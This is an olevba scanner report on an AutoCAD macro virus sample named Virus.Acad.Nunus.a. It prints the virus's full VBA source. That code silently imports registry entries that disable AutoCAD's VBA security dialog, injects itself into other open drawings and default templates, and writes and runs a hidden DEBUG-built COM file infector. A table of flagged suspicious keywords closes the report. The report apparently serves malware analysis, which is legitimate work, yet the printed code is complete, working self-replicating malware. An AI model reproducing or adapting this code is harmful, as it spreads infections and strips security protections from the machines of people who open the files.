olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.Acad.Nunus.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.Acad.Nunus.a - OLE stream: 'RSeStorage/V8/RSeEmbeddings/apc/The VBA Project/_VBA_Project/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Functions.bas 
in file: Virus.Acad.Nunus.a - OLE stream: 'RSeStorage/V8/RSeEmbeddings/apc/The VBA Project/_VBA_Project/VBA/Functions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.Acad.Nunus.a - OLE stream: 'RSeStorage/V8/RSeEmbeddings/apc/The VBA Project/_VBA_Project/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Nonius.bas 
in file: Virus.Acad.Nunus.a - OLE stream: 'RSeStorage/V8/RSeEmbeddings/apc/The VBA Project/_VBA_Project/VBA/Nonius'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents ACADApp As AcadApplication
Private Sub AcadDocument_Activate()
' *********************************
' Gernerated using NAVM
' (c)by Necronomikon/Zer0Gravity
' *********************************
' Author:nec
' Virusname:NAVM.Nonius
Call virus
End Sub

Sub virus()
Set VBEModel = VBE
On Error GoTo startgame
t1 = Application.Preferences.Profiles.ActiveProfile
d1 = Dir("c:\navm.txt")
If a1 = "" Then
Open "c:\nec.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\\acadvba]"
Print #1, ""; AutoEmbedding; "=dword:00000001"
Print #1, ""; AllowBreakOnErrors; "=dword:00000000"
Print #1, ""; ShowSecurityDlg; "=dword:00000000"
Print #1, "[HKEY_LOCAL_MACHINE\Software\Autodesk\AutoCAD\R15.0\ACAD-1:409\Profiles\\acadvba]"
Print #1, ""; AutoEmbedding; "=dword:00000001"
Print #1, ""; AllowBreakOnErrors; "=dword:00000000"
Print #1, ""; ShowSecurityDlg; "=dword:00000000"
Close #1
Reset
Shell "regedit /s c:\nec.reg", vbHide
Application.Quit
End If
startgame:
For X = 1 To Documents.Count
Set necro = VBEModel.Codepanes(X).Codemodule
If necro.Lines(2, 1) = "Set VBEModel = VBE" And Instnavmi = 0 Then
navmi = necro.Lines(1, necro.CountOfLines)
Instnavmi = 1
X = 0
End If
If necro.Lines(2, 1) <> "Set VBEModel = VBE" And Instnavmi = 1 Then
VBEModel.Codepanes(X).Codemodule.InsertLines 1, navmi
Kill "c:\nec.reg"
If d1 = "navm.txt" Then
ACADApp.Documents(X).SaveAs ACADApp.Path & "\Template\acad.dwt", acR15_Template
ACADApp.Documents(X).SaveAs ACADApp.Path & "\Template\acadiso.dwt", acR15_Template
ACADApp.Documents(X).SaveAs ACADApp.Path & "\Template\ACAD -Named Plot Styles.dwt", acR15_Template
ACADApp.Documents(X).SaveAs ACADApp.Path & "\Template\ACADISO -Named Plot Styles.dwt", acR15_Template
d1 = ""
Kill ("c:\navm.txt")
End If
ACADApp.Documents(X).Save
End If
Next X
MsgBox "NAVM.Nonius", 0, "sample generated with navm..."
Open "c:\com.nec" For Output As #1
Print #1, "e 0100  B9 32 00 B8 07 0E CD 10 BA 80 00 B4 1A CD 21 C3"
Print #1, "e 0110  B4 3D B0 02 BA 9E 00 CD 21 93 B4 40 B9 51 01 BA"
Print #1, "e 0120  00 01 CD 21 BA 80 00 B4 1A CD 21 C3 06 01 06 00"
Print #1, "e 0130  06 01 06 00 25 01 06 00 49 01 06 00 06 01 06 00"
Print #1, "e 0140  49 01 06 00 25 01 06 00 C4 00 06 00 06 01 06 00"
Print #1, "e 0150  06 01 06 00 25 01 06 00 49 01 06 00 06 01 0C 00"
Print #1, "e 0160  06 01 0C 00 06 01 06 00 06 01 06 00 25 01 06 00"
Print #1, "e 0170  49 01 06 00 5D 01 06 00 49 01 06 00 25 01 06 00"
Print #1, "e 0180  06 01 06 00 F6 00 06 00 C4 00 06 00 DC 00 06 00"
Print #1, "e 0190  F6 00 06 00 06 01 0C 00 06 01 0C 00 DC 00 06 00"
Print #1, "e 01A0  F6 00 06 00 DC 00 06 00 AE 00 06 00 DC 00 06 00"
Print #1, "e 01B0  F6 00 06 00 06 01 06 00 DC 00 06 00 C4 00 06 00"
Print #1, "e 01C0  DC 00 06 00 C4 00 06 00 AE 00 06 00 A4 00 06 00"
Print #1, "e 01D0  AE 00 06 00 C4 00 07 00 DC 00 06 00 F6 00 06 00"
Print #1, "e 01E0  DC 00 06 00 AE 00 06 00 DC 00 06 00 F6 00 06 00"
Print #1, "e 01F0  06 01 06 00 DC 00 07 00 C4 00 06 00 06 01 06 00"
Print #1, "e 0200  F6 00 06 00 25 01 06 00 06 01 0C 00 06 01 0C 00"
Print #1, "e 0210  00 00 2A 2E 63 6F 6D 00 2A 2A 2A 43 6F 6D 49 6E"
Print #1, "e 0220  66 65 63 74 6F 72 20 66 6F 72 20 27 4E 41 56 4D"
Print #1, "e 0230  27 20 62 79 20 4E 65 63 72 6F 6E 6F 6D 69 6B 6F"
Print #1, "e 0240  6E 2F 5A 65 72 6F 47 72 61 76 69 74 79 2A 2A 2A"
Print #1, "e 0250  00 00"
Print #1, "rcx"
Print #1, "151"
Print #1, "nC:\COMD.COM"
Print #1, "w"
Print #1, "q"
Close #1
Shell "c:\comd.com", vbHide
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |nec.reg             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

